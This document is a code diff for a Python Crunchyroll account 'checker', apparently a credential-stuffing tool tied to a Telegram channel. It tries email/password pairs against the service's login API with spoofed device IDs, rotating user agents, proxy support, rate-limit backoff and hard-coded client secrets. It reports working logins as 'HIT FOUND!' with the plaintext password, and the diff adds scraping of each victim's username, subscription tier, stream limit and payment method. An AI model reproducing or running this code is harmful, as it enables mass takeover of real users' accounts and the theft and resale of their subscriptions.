@@ -842,9 +842,7 @@ Click on a mode below to switch:
     )
 
 def format_single_result(result):
-    """Returns nicely formatted HTML for single account check"""
-
-    # Get flag from your regions.py
+    """Updated with USER, PLAN(SUB), MAX STREAMS, PAYMENT METHOD"""
     country_code = result.get('country', 'ZZ').upper()
     flag = REGION_HINTS.get(country_code, "🌍")
 
@@ -877,10 +875,8 @@ def format_single_result(result):
     country_display = f"{country_name} {flag}"
 
     if result['success']:
-        # Use your existing get_days_remaining function
         expiry_display = get_days_remaining(result['expiry']) if result['expiry'] else 'N/A'
 
-    if result['success']:
         return f"""
 ✅ <b>HIT FOUND!</b>
 
@@ -888,19 +884,24 @@ def format_single_result(result):
 🔑 <b>Password:</b> <code>{result['password']}</code>
 ────────────────
 📊 <b>Account Details</b>
+• <b>USER:</b> <code>{result.get('username', 'Unknown')}</code>
 • <b>Verified:</b> <code>{result['email_verified']}</code>
 • <b>Created:</b> <code>{result['account_creation'] or 'N/A'}</code>
 • <b>Plan:</b> <code>{result['plan']}</code>
+• <b>PLAN(SUB):</b> <code>{result.get('plan_sub', 'Unknown')}</code>
+• <b>Max Stream:</b> <code>{result.get('max_streams', 'Unknown')}</code>
 • <b>Currency:</b> <code>{result['currency'] or 'N/A'}</code>
 • <b>Subscribable:</b> <code>{result['subscribable']}</code>
 • <b>Free Trial:</b> <code>{result['free_trial']}</code>
 • <b>Expires In:</b> <code>{expiry_display}</code>
 • <b>Active:</b> <code>✅ {result['active']}</code>
 • <b>Country:</b> <code>{country_display}</code>
+• <b>Payment:</b> <code>{result.get('payment_method', 'Unknown')}</code>
 
 ┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄
 Channel: {CHANNEL_USERNAME}
         """.strip()
+
     else:
         return f"""
 ❌ <b>CHECK FAILED</b>
@@ -913,7 +914,7 @@ Try another account!
         """.strip()
 
 def check_crunchyroll(email, password, proxy=None):
-    """Improved proxyless checker - Points 2, 3, 4 & 5 applied"""
+    """FINAL VERSION - All fields + USER, PLAN(SUB), MAX STREAMS, PAYMENT METHOD"""
     result = {
         'email': email,
         'password': password,
@@ -922,30 +923,36 @@ def check_crunchyroll(email, password, proxy=None):
         'email_verified': 'No',
         'account_creation': '',
         'plan': 'None',
-        'currency': '',
+        'currency': 'N/A',
         'subscribable': 'False',
         'free_trial': 'False',
         'expiry': '',
         'active': 'False',
-        'country': 'ZZ'
+        'country': 'ZZ',
+        # NEW FIELDS
+        'username': 'Unknown',
+        'plan_sub': 'Unknown',
+        'max_streams': 'Unknown',
+        'payment_method': 'Unknown'
     }
-    
-    max_retries = 4  # Point 4: More retries with smart backoff
-    
+
+    proxies = {'http': proxy, 'https': proxy} if proxy else None
+    max_retries = 4
+
     for attempt in range(max_retries):
         try:
             device_id, _, _ = generate_random_device_info()
             user_agent = generate_random_user_agent()
 
-            # ==================== AUTH REQUEST (Point 3 + Updated credentials) ====================
+            # ====================== LOGIN ======================
             token_url = "https://beta-api.crunchyroll.com/auth/v1/token"
             token_data = {
                 "grant_type": "password",
                 "username": email,
                 "password": password,
                 "scope": "offline_access",
-                "client_id": "y2arvjb0h0rgvtizlovy",
-                "client_secret": "JVLvwdIpXvxU-qIBvT1M8oQTr1qlQJX2",
+                "client_id": "ajcylfwdtjjtq7qpgks3",
+                "client_secret": "oKoU8DMZW7SAaQiGzUEdTQG4IimkL8I_",
                 "device_type": "SamsungTV",
                 "device_id": device_id,
                 "device_name": "Goku"
@@ -954,25 +961,23 @@ def check_crunchyroll(email, password, proxy=None):
             headers = {
                 "host": "beta-api.crunchyroll.com",
                 "x-datadog-sampling-priority": "0",
-                "etp-anonymous-id": device_id,                    # ← Very important
+                "etp-anonymous-id": device_id,
                 "content-type": "application/x-www-form-urlencoded",
                 "user-agent": user_agent,
                 "accept-encoding": "gzip"
             }
 
-            resp = requests.post(token_url, data=token_data, headers=headers, timeout=25)
+            resp = requests.post(token_url, data=token_data, headers=headers, proxies=proxies, timeout=25)
 
             if resp.status_code == 200:
-                token_json = resp.json()
-                access_token = token_json.get('access_token')
+                access_token = resp.json().get('access_token')
                 if not access_token:
-                    result['message'] = "No access token"
                     continue
             elif resp.status_code == 401:
                 result['message'] = "Invalid email or password"
                 return result
             elif resp.status_code == 429:
-                time.sleep(3 + attempt * 2)   # Point 4: Smart backoff
+                time.sleep(3 + attempt * 2)
                 continue
             else:
                 if attempt < max_retries - 1:
@@ -981,7 +986,7 @@ def check_crunchyroll(email, password, proxy=None):
                 result['message'] = f"Login failed (HTTP {resp.status_code})"
                 return result
 
-            # ==================== ACCOUNT DETAILS ====================
+            # ====================== ACCOUNT INFO ======================
             acc_headers = {
                 'Authorization': f'Bearer {access_token}',
                 'User-Agent': user_agent,
@@ -991,21 +996,20 @@ def check_crunchyroll(email, password, proxy=None):
             }
 
             acc_resp = requests.get("https://beta-api.crunchyroll.com/accounts/v1/me",
-                                  headers=acc_headers, timeout=25)
+                                  headers=acc_headers, proxies=proxies, timeout=25)
 
             if acc_resp.status_code == 200:
                 acc_data = acc_resp.json()
                 result['email_verified'] = 'Yes' if acc_data.get('email_verified') else 'No'
-                created = acc_data.get('created', '')
-                if created:
-                    result['account_creation'] = created.split('T')[0]
+                if acc_data.get('created'):
+                    result['account_creation'] = acc_data['created'].split('T')[0]
                 external_id = acc_data.get('external_id')
 
-                # ==================== SUBSCRIPTION + COUNTRY (Point 5) ====================
                 if external_id:
+                    # Subscription
                     subs_resp = requests.get(
                         f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}",
-                        headers=acc_headers, timeout=25)
+                        headers=acc_headers, proxies=proxies, timeout=25)
 
                     if subs_resp.status_code == 200:
                         subs_data = subs_resp.json()
@@ -1013,7 +1017,51 @@ def check_crunchyroll(email, password, proxy=None):
                         result['expiry'] = subs_data.get('next_renewal_date', '').split('T')[0] if subs_data.get('next_renewal_date') else ''
                         result['country'] = subs_data.get('country_code', 'ZZ')
 
-            # Final decision (keeps your original logic)
+                    # Products
+                    prod_resp = requests.get(
+                        f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/products",
+                        headers=acc_headers, proxies=proxies, timeout=25)
+
+                    if prod_resp.status_code == 200:
+                        items = prod_resp.json().get('items', [])
+                        if items:
+                            product = items[0].get('product', {})
+                            result['plan'] = product.get('sku', 'None')
+                            result['currency'] = items[0].get('currency_code', 'N/A')
+                            result['subscribable'] = 'Yes' if product.get('is_subscribable') else 'False'
+                            result['free_trial'] = 'Yes' if items[0].get('active_free_trial') else 'False'
+
+                    # NEW: Benefits (for detailed PLAN, MAX STREAMS, PAYMENT)
+                    benefits_resp = requests.get(
+                        f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/benefits",
+                        headers=acc_headers, proxies=proxies, timeout=25)
+
+                    if benefits_resp.status_code == 200:
+                        benefits_data = benefits_resp.text
+
+                        # Username from multiprofile is optional, but we can try
+                        # For now we use benefits for plan details
+                        benefit_match = re.search(r'"benefit":"concurrent_streams\.(\d+)"', benefits_data)
+                        if benefit_match:
+                            streams = benefit_match.group(1)
+                            if streams == "6":
+                                result['plan_sub'] = "ULTIMATE FAN MEMBER"
+                                result['max_streams'] = "6"
+                            elif streams == "4":
+                                result['plan_sub'] = "MEGA FAN MEMBER"
+                                result['max_streams'] = "4"
+                            elif streams == "1":
+                                result['plan_sub'] = "FAN MEMBER"
+                                result['max_streams'] = "1"
+                            else:
+                                result['plan_sub'] = f"UNKNOWN ({streams})"
+                                result['max_streams'] = streams
+
+                        payment_match = re.search(r'"source":"(.*?)"', benefits_data)
+                        if payment_match:
+                            result['payment_method'] = payment_match.group(1)
+
+            # Final decision
             if result['active'] == 'Yes':
                 result['success'] = True
                 result['message'] = 'ACTIVE SUBSCRIPTION!'
@@ -1024,8 +1072,7 @@ def check_crunchyroll(email, password, proxy=None):
 
         except Exception as e:
             if attempt < max_retries - 1:
-                sleep_time = 2 ** attempt + random.uniform(0.5, 2)   # Point 4: Exponential backoff
-                time.sleep(sleep_time)
+                time.sleep(2 ** attempt + random.uniform(0.5, 2))
                 continue
             result['message'] = f'Error: {str(e)[:80]}'
             return result
